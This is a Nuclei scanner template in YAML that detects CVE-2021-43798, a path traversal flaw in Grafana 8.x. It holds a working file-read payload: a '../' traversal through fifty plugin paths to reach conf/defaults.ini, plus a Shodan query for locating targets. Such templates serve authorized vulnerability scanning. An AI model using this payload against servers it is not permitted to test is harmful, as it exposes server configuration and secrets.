id: grafana-file-read

info:
  name: Grafana 8.x - Local File Inclusion
  author: z0ne,dhiyaneshDk,jeya.seelan,dwisiswant0,j4vaovo
  severity: high
  description: Grafana 8.x is vulnerable to local file inclusion.
  reference:
    - https://grafana.com/blog/2021/12/08/an-update-on-0day-cve-2021-43798-grafana-directory-traversal/
    - https://nosec.org/home/detail/4914.html
    - https://github.com/jas502n/Grafana-VulnTips
    - https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p
    - https://twitter.com/naglinagli/status/1468155313182416899
    - https://nvd.nist.gov/vuln/detail/CVE-2021-43798
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2021-43798
    cwe-id: CWE-22
  metadata:
    max-request: 50
    shodan-query: title:"Grafana"
  tags: grafana,lfi

http:
  - method: GET
    path:
      - "{{BaseURL}}/public/plugins/{{pluginSlug}}/../../../../../conf/defaults.ini"

    payloads:
      pluginSlug:
        - "alertlist"
        - "alertmanager"
        - "annolist"
        - "barchart"
        - "bargauge"
        - "candlestick"
        - "canvas"
        - "cloudwatch"
        - "dashlist"
        - "debug"
        - "elasticsearch"
        - "gauge"
        - "geomap"
        - "gettingstarted"
        - "grafana-azure-monitor-datasource"
        - "grafana-clock-panel"
        - "grafana-piechart-panel"
        - "grafana-polystat-panel"
        - "grafana-simple-json-datasource"
        - "grafana-worldmap-panel"
        - "graph"
        - "graphite"
        - "heatmap"
        - "histogram"
        - "influxdb"
        - "jaeger"
        - "logs"
        - "loki"
        - "mssql"
        - "mysql"
        - "news"
        - "nodeGraph"
        - "opentsdb"
        - "piechart"
        - "pluginlist"
        - "postgres"
        - "prometheus"
        - "stat"
        - "state-timeline"
        - "status-histor"
        - "table"
        - "table-old"
        - "tempo"
        - "testdata"
        - "text"
        - "timeseries"
        - "welcome"
        - "xychart"
        - "zipkin"
    threads: 50
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "socket = /tmp/grafana.sock"
          - "http_port"
        condition: and

      - type: status
        status:
          - 200
